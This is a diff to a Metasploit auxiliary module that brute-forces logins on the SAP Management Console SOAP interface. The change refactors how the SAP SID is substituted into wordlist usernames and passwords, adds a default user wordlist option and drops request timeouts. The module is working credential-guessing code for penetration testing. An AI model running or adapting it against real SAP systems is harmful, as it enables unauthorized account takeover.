@@ -16,13 +16,10 @@ class Metasploit4 < Msf::Auxiliary
     super(
       'Name'           => 'SAP Management Console Brute Force',
       'Description'    => %q{
-        This module simply attempts to brute force the username |
-        password for the SAP Management Console SOAP Interface. By
-        setting the SAP SID value, a list of default SAP users can be
-        tested without needing to set a USERNAME or USER_FILE value.
-        The default usernames are stored in
-        ./data/wordlists/sap_common.txt (the value of SAP SID is
-        automatically inserted into the username to replce <SAPSID>).
+        This module simply attempts to brute force the username and
+        password for the SAP Management Console SOAP Interface. If
+        the SAP_SID value is set it will replace instances of <SAPSID>
+        in any user/pass from any wordlist.
         },
       'References'     =>
         [
@@ -36,8 +33,10 @@ class Metasploit4 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(50013),
-        OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', '']),
+        OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', nil]),
         OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
+        OptPath.new('USER_FILE', [ false, "File containing users, one per line",
+                                   File.join(Msf::Config.data_directory, "wordlists", "sap_common.txt") ])
       ], self.class)
     register_autofilter_ports([ 50013 ])
   end
@@ -46,23 +45,14 @@ class Metasploit4 < Msf::Auxiliary
     res = send_request_cgi({
       'uri'     => normalize_uri(datastore['URI']),
       'method'  => 'GET'
-    }, 25)
+    })
 
     if not res
       print_error("#{rhost}:#{rport} [SAP] Unable to connect")
       return
     end
 
-    if datastore['SAP_SID'] != ''
-      if !datastore['USER_FILE'].nil?
-        print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist")
-      elsif !datastore['USERPASS_FILE'].nil?
-        print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist")
-      else
-        print_status("SAPSID set to '#{datastore['SAP_SID']}' - Setting default SAP wordlist")
-        datastore['USER_FILE'] = Msf::Config.data_directory + '/wordlists/sap_common.txt'
-      end
-    end
+    print_status("SAPSID set to '#{datastore['SAP_SID']}'") if datastore['SAP_SID']
 
     each_user_pass do |user, pass|
       enum_user(user,pass)
@@ -73,7 +63,7 @@ class Metasploit4 < Msf::Auxiliary
   def enum_user(user, pass)
 
     # Replace placeholder with SAP SID, if present
-    if datastore['SAP_SID'] != ''
+    if datastore['SAP_SID']
       user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
       pass = pass.gsub("<SAPSID>", datastore["SAP_SID"])
     end
@@ -113,7 +103,7 @@ class Metasploit4 < Msf::Auxiliary
             'Content-Type'   => 'text/xml; charset=UTF-8',
             'Authorization'  => 'Basic ' + user_pass
           }
-      }, 45)
+      })
 
       return if not res
 
@@ -136,7 +126,7 @@ class Metasploit4 < Msf::Auxiliary
       end
 
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} [SAP #{rhost}] Unable to connect")
+      print_error("#{rhost}:#{rport} [SAP] #{rhost}] Unable to connect")
       return
     end
 
@@ -160,10 +150,8 @@ class Metasploit4 < Msf::Auxiliary
         :target_host => rhost,
         :target_port => rport
       )
-      return
     else
       vprint_error("#{rhost}:#{rport} [SAP] failed to login as '#{user}':'#{pass}'")
-      return
     end
   end
 end
